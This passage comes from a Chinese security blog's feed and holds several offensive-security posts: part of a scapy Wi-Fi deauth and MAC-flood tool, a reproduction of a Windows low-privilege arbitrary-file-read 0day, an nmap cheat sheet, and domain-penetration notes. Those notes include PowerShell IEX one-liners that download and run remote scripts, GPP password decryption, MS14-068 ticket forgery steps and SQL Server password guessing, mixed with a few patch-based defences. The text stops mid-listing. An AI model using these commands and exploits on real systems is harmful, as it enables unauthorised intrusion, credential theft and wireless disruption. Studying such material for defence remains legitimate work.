    print(&apos;[+] MAC:&#123;&#125; SSID:&#123;&#125;&apos;.format(jianting.addr2,bytes.decode(jianting.info,encoding=&apos;utf-8&apos;)))</span><br><span class="line">                print(&apos;MAC:&#123;&#125; SSID:&#123;&#125;&apos;.format(jianting.addr2,bytes.decode(jianting.info,encoding=&apos;utf-8&apos;)),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line"></span><br><span class="line">def start(iface0):</span><br><span class="line">    print(&apos;[+] start mon&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    os.system(&apos;sudo airmon-ng start &#123;&#125;&apos;.format(iface0))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果测试：<br>SSID扫描</p><p><img src="https://s2.ax1x.com/2019/01/04/FThEaq.png" alt="FThEaq.png"></p><p>MAC洪水攻击<br><img src="https://s2.ax1x.com/2019/01/04/FThMM4.png" alt="FThMM4.png"></p><p>Deauch攻击<br><img src="https://s2.ax1x.com/2019/01/04/FThMM4.png" alt="FThMM4.png"></p><p><img src="https://s2.ax1x.com/2019/01/04/FThYi6.png" alt="FThYi6.png"></p><p>防止mdk3的攻击：有人说只能等协议更新有人说YouTube上防御教程。各位师父自行了解<br>github地址：<a href="https://github.com/422926799/python/tree/master/wifidos" target="_blank" rel="noopener">python/wifidos at master · 422926799/python · GitHub</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当遇到需要分析数据包的时候耐心的对比和分析。去scapy寻找对应的协议函数，进行构造发送。不懂及时搜索。</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Windows-Low-Privilege-Arbitrary-File Reading</title>
      <link href="/posts/3562c2e4.html"/>
      <url>/posts/3562c2e4.html</url>
      <content type="html"><![CDATA[<h3 id="0x01Readfile-0day介绍"><a href="#0x01Readfile-0day介绍" class="headerlink" title="0x01Readfile 0day介绍"></a>0x01Readfile 0day介绍</h3><p>引用：</p><blockquote><p>该bug在“MsiAdvertise.”中<br>调用此函数将导致安装程序服务复制文件。<br>这将把可以用第一个参数控制的任意文件复制到c:windowsinstaller……在模拟时完成检查，但是使用连接仍然有一个TOCTOU。这意味着我们可以将它复制为SYSTEM的任何文件，并且目标文件总是可读的。这会导致任意文件读取漏洞。<br>繁殖：<br>确保复制readfile.exe和“file”（在文件夹PoC-Files下找到）……并将它们放在同一个目录中。<br>使用：read file.exe targetfile（其中targetfile是要读取的文件，IE：“read file.exe c:userstestdesktopdesktop.ini”）<br>运行在2个内核或更多，这应该在一个内核上工作并做一些修改。既然你也可以按时上锁（不过我很懒）。如果可以的话，您应该能够看到这样的东西：<a href="https://www.youtube.com/watch?v=x4P2H64GI1o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=x4P2H64GI1o</a><br>确认该bug的最简单方法是创建两个本地帐户，并读取另一个帐户的desktop.ini。<br>即使没有枚举向量，这仍然是坏消息，因为许多文档软件，如.，实际上将文件保存在静态位置，其中包含最近打开的文档的完整路径和文件名。因此，通过像这样读取文件，您可以获得其他用户创建的文档的文件名。文件系统是一个蜘蛛网，到处都可以找到对用户创建文件的引用。因此，没有枚举bug并不重要。<br>如果启用了影子副本，您显然可以窃取SAM和System蜂箱，我猜想……<br>也许还有其他的用例。但是我不是很聪明，所以我不知道。</p></blockquote><h3 id="0x02复现过程"><a href="#0x02复现过程" class="headerlink" title="0x02复现过程"></a>0x02复现过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.创建一个低权限用户</span><br><span class="line">b.切换到低权限用户读取notepad c:\users\Administrator\Desktop\desktop.ini发现没有权限读取，使用Readfile里的Readfile.exe执行：Readfile.exe C:\User\Administrator\Desktop\desktop.ini读取成功</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/22/FyVSPI.png" alt="FyVSPI.png"></p><p>YouTube视频：<a href="https://www.youtube.com/watch?v=x4P2H64GI1o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=x4P2H64GI1o</a><br>复现工具地址：<a href="https://github.com/422926799/note/tree/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E4%BB%8E%E4%BD%8E%E6%9D%83%E8%AF%BB%E5%8F%96Administrator%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/%E5%B7%A5%E5%85%B7/Readfile" target="_blank" rel="noopener">note/学习记录/漏洞复现/从低权读取Administrator任意文件/工具/Readfile at master · 422926799/note · GitHub</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nmap-note</title>
      <link href="/posts/c80d7fdf.html"/>
      <url>/posts/c80d7fdf.html</url>
      <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>继续读《web安全攻防渗透测试实战指南》，做一下读书笔记。分享一下学习到的东西<br><img src="http://i0.hdslb.com/bfs/archive/31e5a9ad5b4c26aba172443079adc39e9578a397.jpg" alt="31e5a9ad5b4c26aba172443079adc39e9578a397.jpg"></p><h2 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">-iL 从txt导入目标IP进行扫描 nmap -iL iplist.txt</span><br><span class="line">--exclude 后面跟不扫描的IP 例子：nmap -iL iplist.txt --exclude 127.0.0.1</span><br><span class="line">--excludefile 从文件中导入不扫描的ip 例子： nmap -iL iplist.txt --excludefile notip.txt</span><br><span class="line">-sL 仅列举指定目标IP，不进行主机扫描 例子：nmap -sL 127.0.0.1 192.168.3.39|nmap -iL iplist.txt -sL</span><br><span class="line">-sn 只进行主机发现，不进行端口扫描 例子：nmap -sn 192.168.3.39</span><br><span class="line">-Pn 将所有指定的主机视为开启，不进行主机发现 例子:nmap -Pn 192.168.3.39</span><br><span class="line">-PS/PA/PU/PY 使用TCP/SYN/ACK或SCTP INIT/ECHO 方式来发现 例子：nmap -PS 192.168.3.39|nmap -PA 192.168.3.39|nmap -PU 192.168.3.39|nmap -PY 192.168.3.39</span><br><span class="line">-PE/-PP/PM 使用ICMP echo，timestamep,netmask请求包发现主机 例子：nmap -PE 192.168.3.39|nmap -PP 192.168.3.39|nmap -PM 192.168.3.39</span><br><span class="line">-PO 使用IP协议包探测对方主机是否开启 例子：nmap -PO 192.168.3.39</span><br><span class="line">-n/-R -n表示不进行DNS解析：-R表示总是进行DNS解析 例子：nmap -sV -n 127.0.0.1|nmap -R 127.0.0.1</span><br><span class="line">--dns-servers 指定DNS服务器 例子：nmap -R 192.168.3.39 --dns-servers</span><br><span class="line">--system-dns 指定使用系统的DNS服务器 例子：nmap -R 192.168.3.39 --system-dns</span><br><span class="line">--traceroute 追踪每个路由节点 例子：nmap 192.168.3.34 --traceroute</span><br><span class="line">-sS/sT/sA/sW/sM 指定使用：TCP SYN/Connect()/ACK/Window/Maimon scans的方式对目标主机进行扫描</span><br><span class="line">-sU 使用UDP方式扫描UDP端口 例子：nmap -sU 192.168.3.39</span><br><span class="line">-sN/sF/sX 指定使用TCP Null/FIN/Xmas scans秘密扫描的方式协助探测对方的TCP端口状态</span><br><span class="line">--scanflags 定制TCP包flags 例子：nmap -sV 192.168.3.39 --scanflags 1</span><br><span class="line">-sI 指定使用Idle scan的方式扫描目标主机 例子：nmap -sI 空闲主机IP -Pn 目标主机IP</span><br><span class="line">-sY/sZ 使用SCTP INIT/COOKIE-ECHO扫描SCTP协议端口的开放状态</span><br><span class="line">-sO 确定目标主机支持的协议 例子：nmap -sO 192.168.3.39</span><br><span class="line">-b 使用FTP bounce scan扫描方式 例子：nmap -b 192.168.3.39</span><br><span class="line">-p  指定扫描的端口 例子：nmap -p 3389,445 192.168.3.39</span><br><span class="line">-F 快速扫描模式，只扫描TOP100的端口 例子：nmap -F 192.168.3.39</span><br><span class="line">-r 不进行端口打乱的操作，让nmap的扫描不轻易的被对方的防火墙检测到 例子：nmap -p 445,135 -r 192.168.3.39</span><br><span class="line"></span><br><span class="line">更多脚本请参考：https://nmap.org/nsedoc/categories</span><br><span class="line">--top-ports 扫描开放概率最高的端口 （Nmap作者曾经做过大规模的扫描，以统计开放概率最高的端口。默认情况下nmap会扫描最有可能的1000个端口） 例子：nmap 192.168.3.39 --top-ports 445</span><br><span class="line">--port-raito 扫描指定频率以上的端口</span><br><span class="line">-sV 指定nmap进行版本探测 例子：nmap -sV 192.168.3.39</span><br><span class="line">--version-intensity 指定版本探测深度(范围:0-9) nmap -sV 192.168.3.39 --version-inensity 9</span><br><span class="line">--version-light 指定轻量级侦探方式（intensity 2）</span><br><span class="line">--version-all 尝试使用所有的probes进行侦测</span><br><span class="line">--version-trace 显示出详细版本侦测过程信息</span><br><span class="line">-A 表示全方面扫描 例子：nmap -A 192.168.3.39</span><br><span class="line">-T 扫描速度 (范围：1-5) 例子 nmap -A-T5 192.168.3.39</span><br><span class="line">-sC 全面收集信息 例子：nmap -sC 192.168.3.39</span><br><span class="line">-sP 判断目标是否存活</span><br><span class="line">-O 判断目标操作系统</span><br><span class="line">-sF 探测目标防火墙状态</span><br><span class="line">常用的扫描方式:</span><br><span class="line">nmap 192.168.3.39</span><br><span class="line">nmap 192.168.3.0/24 扫描网段</span><br><span class="line">nmap -A -T5 192.168.3.35</span><br><span class="line">nmap -sV -T5 192.168.3.39</span><br><span class="line">nmap -sC 192.168.3.39</span><br><span class="line">nmap -sS 192.168.3.39</span><br><span class="line">nmap -sC -n -sV --version-inensity 9 -T5 192.168.3.39</span><br><span class="line">nmap -iL iplist.txt --exclude 127.0.0.1</span><br><span class="line">nmap -iL iplist.txt --excludefile notip.txt</span><br><span class="line">nmap -p 135,445,3389 192.168.3.39</span><br><span class="line">nmap --traceroute 192.168.3.39</span><br><span class="line">nmap -O 192.168.3.39</span><br><span class="line">nmap -sF 192.168.3.39</span><br><span class="line"></span><br><span class="line">常见6种nmap端口状态及协议</span><br><span class="line">open 开放的</span><br><span class="line">filetered 被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</span><br><span class="line">close 关闭的</span><br><span class="line">unfiltered 未被过滤的，表示nmap无法确定端口所在状态,需进一步探测</span><br><span class="line">open/filetered 开放的或被过滤的，nmap不能识别</span><br><span class="line">close/filetered 关闭的或被过滤的，nmap不能识别</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Nmap进阶：</span><br><span class="line">nmap的默认脚本存放在/xx/nmap/scripts的文件夹下</span><br><span class="line">nmap的脚本主要分为以下几类</span><br><span class="line">Auth 负责处理鉴权处理</span><br><span class="line">Broadcast 在局域网内探查更多服务的开启情况，如DHCP/DNS/SQLserver</span><br><span class="line">Brute 针对常见的应用提供暴力破解方式，如HTTP/SMTP等</span><br><span class="line">Default 针对-sC或-A选项提供默认脚本，提供基本脚本的扫描能力</span><br><span class="line">Discovery 对网络进行更多的扫描，如SMB枚举，SNMP查询等</span><br><span class="line">Dos 用于进行拒绝服务攻击</span><br><span class="line">Exploit 利用已知的漏洞入侵系统</span><br><span class="line">External 利用第三方数据库或资源，例如：进行whois解析</span><br><span class="line">Fuzzer 模糊测试脚本，发送异常包给目标机，探测潜在漏洞</span><br><span class="line">Intrusive 入侵性脚本，此类脚本可能会引起对方的IDS/IPS的记录等</span><br><span class="line">Malware 探测目标机是否感染了病毒，开启了后门信息等</span><br><span class="line">Safe 此类脚本与Intrusive相反，属于安全脚本</span><br><span class="line">Version 负责增强服务与版本扫描功能的脚本</span><br><span class="line">Vuln 负责检查目标机是否有常见的漏洞如MS17-010</span><br><span class="line"></span><br><span class="line">脚本使用方法 例子：nmap --script=auth（脚本名称） IP</span><br><span class="line">常用脚本：</span><br><span class="line">用户还可以根据配置--script=类别进行扫描，常用参数如下表示</span><br><span class="line">-sC/--script=Default 使用默认的脚本进行扫描</span><br><span class="line">--script=&lt;Lua scripts&gt; 使用某个脚本进行扫描</span><br><span class="line">--script-args=key1=value1,key2=value2 该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如果还有更多参数逗号连接</span><br><span class="line">--script-args-file=filename 使用文件为脚本提供参数</span><br><span class="line">--script-trace 如果设置参数，则显示脚本执行过程中发送与接收数据</span><br><span class="line">--script-updatedb 在nmap的scripts目录中有一个script.db文件，该文件保存了当前nmap可用的脚本,类似于一个小型的数据库，如果我们开启nmap并调用了此参数，就会进行脚本更新</span><br><span class="line">--script-help 输出对应脚本的使用参数，以及详细的介绍信息 用法：nmap --script-help auth</span><br></pre></td></tr></table></figure><p>笔记：<a href="https://github.com/422926799/note" target="_blank" rel="noopener">GitHub - 422926799/note</a><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>细读域渗透文章得到的总结</title>
      <link href="/posts/9824134d.html"/>
      <url>/posts/9824134d.html</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>昨天看到一篇不错的域渗透文章。想理解里面的内容，然后耗费的时间有点多，不过收获还是很多的起码了解了域渗透该咋弄，怎么维持权限等等之类。由于时间不够无法搭建好环境进行域渗透学习（下午上学）。先写个目前总结的，等下个星期或者在学校搭建好环境在写一篇。<br><img src="https://wx3.sinaimg.cn/wap720/0064U3Yugy1fre4xtbm06j31be0qotcv.jpg" alt="0064U3Yugy1fre4xtbm06j31be0qotcv.jpg"></p><h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p>1.首先要知道那台是域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.查看自己的DNS地址</span><br><span class="line">2.扫描端口开了389的那台就是</span><br></pre></td></tr></table></figure><p>2.使用powershell进行信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cheetz/PowerTools 用于域信息收集的项目</span><br><span class="line">1.先将这个项目下载到vps或本地通过ngrok映射到公网</span><br><span class="line">2.打开powershell执行：IEX (New.ObjectNet.WebClient).DownloadString(&apos;http://IP地址/powerview.ps1&apos;);Get-HostIP</span><br><span class="line"></span><br><span class="line">    Get-HostIP                      -   resolves a hostname to an IP</span><br><span class="line">    Check-Write                     -   checks if the current user can write to the specified file</span><br><span class="line">    Set-MacAttribute                -   Sets MAC attributes for a file based on another file or input (from Powersploit)</span><br><span class="line">    Invoke-CopyFile                 -   copies a local file to a remote location, matching MAC properties</span><br><span class="line">    Test-Server                     -   tests connectivity to a specified server</span><br><span class="line">    Get-UserProperties              -   returns all properties specified for users, or a set of user:prop names</span><br><span class="line">    Get-ComputerProperties          -   returns all properties specified for computers, or a set of computer:prop names</span><br><span class="line">    Get-LastLoggedOn                -   return the last logged on user for a target host</span><br><span class="line">    Get-UserLogonEvents             -   returns logon events from the event log for a specified host</span><br><span class="line">    Get-UserTGTEvents               -   returns TGT request events for a specified host</span><br><span class="line">    Invoke-CheckLocalAdminAccess    -   check if the current user context has local administrator access</span><br><span class="line">                                        to a specified host</span><br><span class="line">    Invoke-SearchFiles              -   search a local or remote path for files with specific terms in the name</span><br><span class="line">    Convert-NameToSid               -   converts a user/group name to a security identifier (SID)</span><br><span class="line">    Convert-SidToName               -   converts a security identifier (SID) to a group/user name</span><br><span class="line">    </span><br><span class="line">    详细使用：https://github.com/cheetz/PowerTools/tree/master/PowerView</span><br></pre></td></tr></table></figure><p>3.SYSVOL GPP漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">SYSVOL是指存储公共服务器副本的共享文件夹，它们在域中所有的域控制器之间复制.Sysvol文件夹是安装AD时创建的，它用来存放GPO，脚本等信息。同时，存放Sysvol文件文件夹中的信息，会复制到域中所有DC上。</span><br><span class="line"></span><br><span class="line">域服务器一般都会共享这个文件夹，或者搜索当前机器下的XML文件将包含凭据：groups.xml，scheduledtasks.xml，services.xml中，datasources.xml</span><br><span class="line"></span><br><span class="line">映射驱动（Drives.xml）</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建/更新服务（services.xml中）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line"></span><br><span class="line">由于经过身份验证的用户（任何域用户或受信任域中的用户）具有对SYSVOL的读取权限</span><br><span class="line"></span><br><span class="line">\192.168.50.205sysvolpentest.comPolicies&#123;84017B64-2662-4BA3-A06C-FB953CCBE92D&#125;UserPreferencesGroups.xml</span><br><span class="line">经过AES-256位加密</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cpassword=&quot;fUCMHAw9I2PdYRZEBMS54IvtPHX3ni44qRkWtfBtxoA&quot;</span><br><span class="line">可以使用AES私钥解密GPP密码</span><br><span class="line"></span><br><span class="line">微软在MSDN上发布了AES加密密钥（共享密钥）</span><br><span class="line">https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx</span><br><span class="line"></span><br><span class="line">使用PowerShell的脚本解密</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</span><br><span class="line"></span><br><span class="line">寻找SYSVOL里的密码和攻击GPP（组策略偏好</span><br><span class="line">注：当创建了一个域用户后，将其添加到验证组策略对象。在SYSVOL的xml文件会有用户的配置文件</span><br><span class="line">http://www.91ri.org/14909.html</span><br><span class="line"></span><br><span class="line">防SYSVOL更新配置文件：</span><br><span class="line">防：</span><br><span class="line">*在用于管理GPO的计算机上安装KB2962486，以防止将新凭据置于组策略首选项中。</span><br><span class="line">*设置每个人访问权限</span><br><span class="line">*不在组策略中使用域控密码</span><br><span class="line">*设置共享文件夹SYSVOL的访问权限</span><br><span class="line">*删除现有的GPP里包含密码的XML文件。</span><br></pre></td></tr></table></figure><p>4.MS14-068攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">需要条件：</span><br><span class="line">域用户及其口令</span><br><span class="line">域用户对应sid</span><br><span class="line">域控地址 Win7及以上系统</span><br><span class="line">Tips：</span><br><span class="line">1. 操作系统要求Win7及以上，这是因为XP不支持导入Ticket</span><br><span class="line">2. 攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击</span><br><span class="line">3. 将Python脚本转成exe即可在任意一台Windows主机使用</span><br><span class="line">注意事项：</span><br><span class="line">Tips：</span><br><span class="line">1. 如果不先清除内存中的Ticket直接导入，有可能会失败</span><br><span class="line">2. 连接域控要使用域控地址，不要用IP</span><br><span class="line">利用方法：https://www.cnblogs.com/backlion/p/6820744.html?utm_source=itdadao&amp;utm_medium=referral</span><br><span class="line"></span><br><span class="line">MS14-068过程：</span><br><span class="line">1.请求没有PAC的Kerberos TGT认证票据作为标准用户，DC回复TGT</span><br><span class="line">2.生成一个伪造的PAC，没有密钥，所以生成的PAC使用域用户的密码数据用MD5算法而不是HMAC_MD5“签名”。</span><br><span class="line">3.作为TGS服务票据请求的一部分，使用伪造的PAC作为授权数据发送无PAC的TGT到DC。</span><br><span class="line">4.DC似乎被这个混淆了，所以它放弃了用户发送的不含PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到它自己的授权数据中，并将这个TGT发送给用户。</span><br><span class="line">5.这个伪造PAC的TGT使得用户可以成为易受攻击的DC上的域管理员。</span><br><span class="line"></span><br><span class="line">防御：安装检查KB3011780的安装</span><br></pre></td></tr></table></figure><p>5.SPN扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包</span><br><span class="line">SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内置帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。</span><br><span class="line">SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。</span><br><span class="line">powershell -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers&apos;); Discover-PSMSSQLServers&quot;</span><br></pre></td></tr></table></figure><p>6.扫描SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*脚本地址：https://github.com/nullbind/Powershellery/tree/master/Stable-ish/MSSQL</span><br><span class="line">*用法：Import-Module .Get-SQLServerAccess.psm1或者放到VPS用下载并执行的方式来执行脚本</span><br><span class="line">*弱口令猜解：Get-SQLServerAccess -sqluser sa -sqlpass 123qwe!@#</span><br><span class="line">*寻找敏感数据：Get-SQLServerAccess -query &quot;select name as &apos;Databases&apos; from master..sysdatabases where HAS_DBACCESS(name) = 1&quot;</span><br><span class="line"></span><br><span class="line">非扫描式的SQL Server发现</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning</span><br></pre></td></tr></table></figure><p>7.票据</p><p><img src="https://image.3001.net/images/20141002/14122235056423.jpg!small" alt="14122235056423.jpg!small"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 